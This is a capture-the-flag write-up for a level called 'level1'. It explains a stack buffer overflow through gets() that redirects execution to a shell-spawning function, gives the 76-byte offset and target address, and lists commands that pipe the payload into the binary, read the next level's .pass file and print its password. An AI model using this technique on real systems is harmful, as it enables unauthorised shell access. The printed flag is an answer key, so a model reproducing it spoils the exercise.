solution level1:

-> we disassemble the main and see that space is allocated on the stack and the method gets is called
...
0x08048486 <+6>:	sub    esp,0x50
0x08048489 <+9>:	lea    eax,[esp+0x10]
0x0804848d <+13>:	mov    DWORD PTR [esp],eax
0x08048490 <+16>:	call   0x8048340 <gets@plt>
...

-> from the man of gets:
Never use gets(). Because it is impossible to tell without knowing the data in advance how many characters gets() will read, and because gets() will continue to store characters past the end of the buffer, it is extremely dangerous to use. It has been used to break computer security. Use fgets() instead.

-> the program has a function called "run", which calls the method system to open a new shell with execution rights

-> we can use the gets method and exploit its vulnerability to buffer overflows. For this, we simply fill the stack until we reach the instruction pointer and replace it with the desired address

-> the buffer is 64 bytes long, and we also have to take into account the stack alignment (8 bytes) and the saved ebp (4 bytes), for a total of 76 bytes

-> so we fill the buffer with 76 bytes, and then add the address of function run, which is 0x08048444 (we reverse to little-endian). This will replace the address in the saved eip with the address of run, effectively calling it when we leave the main

> scp -P 2222 Ressources/run.sh level1@127.0.0.1:/tmp/

> bash -x /tmp/run.sh
> cat /tmp/overf - | ./level1
> cat /home/user/level2/.pass
> 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
